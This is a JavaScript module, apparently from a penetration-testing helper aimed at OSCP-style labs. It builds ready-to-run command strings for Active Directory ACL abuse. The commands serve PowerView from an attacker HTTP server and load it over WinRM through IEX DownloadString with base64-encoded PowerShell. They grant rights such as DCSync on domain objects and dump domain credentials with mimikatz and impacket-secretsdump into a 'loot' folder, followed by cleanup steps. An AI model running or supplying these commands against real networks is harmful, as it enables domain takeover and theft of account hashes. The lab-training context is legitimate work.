const canonicalRight = (value) => {
  const rights = new Map([
    ["all", "All"],
    ["resetpassword", "ResetPassword"],
    ["writemembers", "WriteMembers"],
    ["dcsync", "DCSync"],
  ]);
  return rights.get(String(value || "").trim().toLowerCase()) || "";
};

const shellQuote = (value) => `'${String(value).replaceAll("'", `'"'"'`)}'`;
const variableValue = (variables, key) => String(variables[key] || `{{${key}}}`).trim();

const principalSid = "$PrincipalObject = Get-DomainObject -Identity '{{aclPrincipal}}' -Domain '{{domain}}' -Properties objectSid; if (-not $PrincipalObject) { throw 'ACL principal {{aclPrincipal}} was not found in {{domain}}' }; $PrincipalSidValue = @($PrincipalObject.objectSid)[0]; if ($PrincipalSidValue -is [byte[]]) { $PrincipalSid = (New-Object System.Security.Principal.SecurityIdentifier($PrincipalSidValue, 0)).Value } elseif ($PrincipalSidValue -and $PrincipalSidValue.PSObject.Properties['Value']) { $PrincipalSid = [string]$PrincipalSidValue.Value } else { $PrincipalSid = [string]$PrincipalSidValue }; if ($PrincipalSid -notmatch '^S-1-') { throw ('ACL principal resolved to an invalid SID: ' + $PrincipalSid) }";
const aclQuery = "Get-DomainObjectAcl -Identity '{{aclTarget}}' -Domain '{{domain}}' -ResolveGUIDs | Where-Object { $AceSid = if ($_.SecurityIdentifier -and $_.SecurityIdentifier.PSObject.Properties['Value']) { [string]$_.SecurityIdentifier.Value } else { [string]$_.SecurityIdentifier }; $AceSid -eq $PrincipalSid }";
const baselinePath = "$BaselinePath = Join-Path $env:TEMP 'oscp-acl-before.xml'";
const aclColumns = "SecurityIdentifier,ActiveDirectoryRights,ObjectAceType,AceType,AceQualifier,AccessMask,IsInherited";
const aclKey = "$AceSid = if ($_.SecurityIdentifier -and $_.SecurityIdentifier.PSObject.Properties['Value']) { [string]$_.SecurityIdentifier.Value } else { [string]$_.SecurityIdentifier }; '{0}|{1}|{2}|{3}|{4}|{5}|{6}' -f $AceSid,[string]$_.ActiveDirectoryRights,[string]$_.ObjectAceType,[string]$_.AceType,[string]$_.AceQualifier,[string]$_.AccessMask,[string]$_.IsInherited";
const snapshot = (rows, keys) => `${keys} = @('__ACL_BASELINE__') + @(${rows} | Where-Object { $null -ne $_ } | ForEach-Object { ${aclKey} })`;
const compareAcl = `${snapshot("$Current", "$CurrentKeys")}; $Diff = @(Compare-Object -ReferenceObject $BeforeKeys -DifferenceObject $CurrentKeys)`;

const winrmIdentity = (variables) => `-d ${shellQuote(variableValue(variables, "domain"))} -u ${shellQuote(variableValue(variables, "user"))}`;
const winrmAuth = (variables) => String(variables.password || "").trim()
  ? `-p ${shellQuote(variables.password)}`
  : `-H ${shellQuote(variableValue(variables, "hash"))}`;

const powerViewHost = "pv='{{powerViewPath}}'; pv_url='http://{{lhost}}:{{powerViewPort}}/PowerView.ps1'; pv_log='{{workspaceRoot}}/{{targetName}}/notes/powerview-http.log'; test -f \"$pv\" || { echo 'PowerView.ps1 was not found; update POWER VIEW PATH'; exit 1; }; mkdir -p \"$(dirname \"$pv_log\")\"; if ! curl -fsS --max-time 2 \"$pv_url\" | grep -qi 'function Get-DomainObjectAcl'; then (cd \"$(dirname \"$pv\")\" && nohup python3 -m http.server {{powerViewPort}} --bind {{lhost}} >\"$pv_log\" 2>&1 &); sleep 1; fi; curl -fsS --max-time 2 \"$pv_url\" | grep -qi 'function Get-DomainObjectAcl' || { echo \"PowerView HTTP staging failed at $pv_url; choose a free POWER VIEW HTTP PORT and inspect $pv_log\"; tail -n 20 \"$pv_log\" 2>/dev/null; exit 1; }";

const remotePowerView = (script, variables) => {
  const loader = "$ErrorActionPreference = 'Stop'; $ProgressPreference = 'SilentlyContinue'; $PowerViewUrl = 'http://{{lhost}}:{{powerViewPort}}/PowerView.ps1'; try { IEX((New-Object Net.WebClient).DownloadString($PowerViewUrl)) } catch { throw ('PowerView download or load failed from ' + $PowerViewUrl + ': ' + $_.Exception.Message) }";
  const payload = shellQuote(`${loader}; ${script}`);
  return `${powerViewHost}; payload=$(printf '%s' ${payload} | iconv -f UTF-8 -t UTF-16LE | base64 -w0); nxc winrm {{rhost}} ${winrmIdentity(variables)} ${winrmAuth(variables)} -X \"powershell.exe -NoLogo -NoProfile -NonInteractive -EncodedCommand $payload\"`;
};

export function buildAclCommands(variables = {}) {
  const right = canonicalRight(variables.aclRights);
  if (!right) {
    return [{
      key: "acl-invalid-right",
      label: "Choose a supported PowerView ACL right",
      value: "printf '%s\\n' 'ACL rights must be one of: All, ResetPassword, WriteMembers, DCSync' >&2; false",
    }];
  }
  const target = String(variables.aclTarget || "selected target").trim();
  const principal = String(variables.aclPrincipal || "selected principal").trim();
  const validDcsyncTargets = [variables.domain, variables.baseDn]
    .map((value) => String(value || "").trim().toLowerCase())
    .filter(Boolean);
  if (right === "DCSync" && variables.aclTarget && validDcsyncTargets.length
    && !validDcsyncTargets.includes(target.toLowerCase())) {
    return [{
      key: "acl-invalid-dcsync-target",
      label: "Set the DCSync ACL target to the domain object",
      value: `printf '%s\\n' ${shellQuote(`DCSync must be granted on the domain object. Set ACL TARGET to ${variables.domain || variables.baseDn}, not ${target}.`)} >&2; false`,
    }];
  }
  const identity = `${right}: ${principal} -> ${target}`;
  const commands = [
    {
      key: "acl-winrm-check",
      label: `WinRM: test ${principal}'s remote access`,
      value: `nxc winrm {{rhost}} ${winrmIdentity(variables)} ${winrmAuth(variables)}`,
    },
    {
      key: "acl-evil-winrm",
      label: "Evil-WinRM: open an interactive PowerView fallback",
      value: `evil-winrm -i {{rhost}} -u ${shellQuote(`${variableValue(variables, "domain")}\\${variableValue(variables, "user")}`)} ${winrmAuth(variables)} -s \"$(dirname '{{powerViewPath}}')\"`,
    },
    {
      key: "acl-powerview-check",
      label: "PowerView over WinRM: confirm required functions",
      value: remotePowerView("$RequiredFunctions = @('Get-DomainObject','Get-DomainObjectAcl','Add-DomainObjectAcl','Remove-DomainObjectAcl'); $MissingFunctions = @($RequiredFunctions | Where-Object { -not (Get-Command $_ -ErrorAction SilentlyContinue) }); if ($MissingFunctions.Count) { throw ('PowerView is missing required functions: ' + ($MissingFunctions -join ', ')) }; 'PowerView loaded successfully from ' + $PowerViewUrl; Get-Command $RequiredFunctions | Select-Object Name,CommandType", variables),
    },
    {
      key: "acl-capture-before",
      label: `Capture current ACL — ${identity}`,
      value: remotePowerView(`${principalSid}; ${baselinePath}; $Before = @(${aclQuery}); ${snapshot("$Before", "$BeforeKeys")}; $BeforeKeys | Export-Clixml -Path $BaselinePath; 'Resolved principal SID: ' + $PrincipalSid; 'Captured ' + $Before.Count + ' matching ACL entries to ' + $BaselinePath; if ($Before.Count) { $Before | Select-Object ${aclColumns} | Format-Table -AutoSize } else { 'No matching ACE existed before the grant; an empty baseline is valid' }`, variables),
    },
    {
      key: "acl-grant",
      label: `Grant ${right} — ${principal} on ${target}`,
      value: remotePowerView(`Add-DomainObjectAcl -TargetIdentity '{{aclTarget}}' -TargetDomain '{{domain}}' -PrincipalIdentity '{{aclPrincipal}}' -PrincipalDomain '{{domain}}' -Rights '${right}' -Verbose`, variables),
    },
    {
      key: "acl-verify-grant",
      label: `Review granted ACL change — ${identity}`,
      value: remotePowerView(`${principalSid}; ${baselinePath}; if (-not (Test-Path $BaselinePath)) { throw ('ACL baseline was not found at ' + $BaselinePath + '; run Capture current ACL first') }; $BeforeKeys = @(Import-Clixml -Path $BaselinePath); $Current = @(${aclQuery}); ${compareAcl}; $Added = @($Diff | Where-Object SideIndicator -eq '=>'); 'Resolved principal SID: ' + $PrincipalSid; if ($Current.Count) { $Current | Select-Object ${aclColumns} | Format-Table -AutoSize } else { 'No matching ACE currently exists for the principal' }; if (-not $Added.Count) { throw 'No added ACL entry was detected relative to the captured baseline' }; 'Added normalized ACL entries:'; $Added | Format-Table InputObject,SideIndicator -AutoSize`, variables),
    },
  ];

  if (right === "DCSync") {
    commands.push({
      key: "acl-dcsync-mimikatz",
      label: `Mimikatz console: DCSync as ${principal}`,
      value: "lsadump::dcsync /domain:{{domain}} /user:{{dcsyncUser}}",
    });

    const samePrincipal = !variables.aclPrincipal || !variables.user
      || String(variables.aclPrincipal).trim().toLowerCase() === String(variables.user).trim().toLowerCase();
    if (samePrincipal) {
      commands.push(
        {
          key: "acl-dcsync-impacket-password",
          label: `Impacket DCSync with ${principal}'s password`,
          value: "mkdir -p '{{workspaceRoot}}/{{targetName}}/loot/dcsync'; impacket-secretsdump -just-dc-user '{{dcsyncUser}}' '{{domain}}/{{user}}:{{password}}@{{rhost}}' | tee '{{workspaceRoot}}/{{targetName}}/loot/dcsync/{{dcsyncUser}}.txt'",
        },
        {
          key: "acl-dcsync-impacket-hash",
          label: `Impacket DCSync with ${principal}'s NT hash`,
          value: "mkdir -p '{{workspaceRoot}}/{{targetName}}/loot/dcsync'; impacket-secretsdump -hashes ':{{hash}}' -just-dc-user '{{dcsyncUser}}' '{{domain}}/{{user}}@{{rhost}}' | tee '{{workspaceRoot}}/{{targetName}}/loot/dcsync/{{dcsyncUser}}.txt'",
        },
      );
    }
  }

  commands.push(
    {
      key: "acl-cleanup",
      label: `Cleanup ${right} — ${principal} on ${target}`,
      value: remotePowerView(`Remove-DomainObjectAcl -TargetIdentity '{{aclTarget}}' -TargetDomain '{{domain}}' -PrincipalIdentity '{{aclPrincipal}}' -PrincipalDomain '{{domain}}' -Rights '${right}' -Verbose`, variables),
    },
    {
      key: "acl-verify-cleanup",
      label: `Verify ACL restoration — ${identity}`,
      value: remotePowerView(`${principalSid}; ${baselinePath}; if (-not (Test-Path $BaselinePath)) { throw ('ACL baseline was not found at ' + $BaselinePath + '; run Capture current ACL first') }; $BeforeKeys = @(Import-Clixml -Path $BaselinePath); $Current = @(${aclQuery}); ${compareAcl}; if ($Diff.Count) { $Diff | Format-Table InputObject,SideIndicator -AutoSize; throw 'ACL cleanup does not match the captured baseline' } else { Remove-Item -Path $BaselinePath -Force; 'ACL cleanup matches the captured baseline; removed ' + $BaselinePath }`, variables),
    },
  );

  return commands;
}
